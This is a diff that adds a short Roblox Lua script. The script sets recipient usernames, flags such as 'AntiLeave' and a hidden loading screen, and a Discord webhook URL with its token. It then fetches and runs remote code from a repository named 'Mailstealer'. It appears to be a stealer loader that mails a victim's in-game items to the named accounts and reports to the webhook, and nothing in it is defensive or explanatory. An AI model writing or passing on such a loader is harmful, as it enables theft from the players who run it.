@@ -1,0 +1,11 @@
+UserName = "mxrcuszzzzz"
+UserName2 = "mxrcuszzzzz"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true 
+_G.MouseLock = false 
+
+Webhook = "https://discord.com/api/webhooks/1122344777736781824/mtUBbUK38qVn4ue06En9UWgs0uHYv16xQ44hBrkoB2n1QUUlBAVO00cS-Hvn9eq-7n3l" 
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LucidHacker9999/Mailstealer/main/script.lua"))()
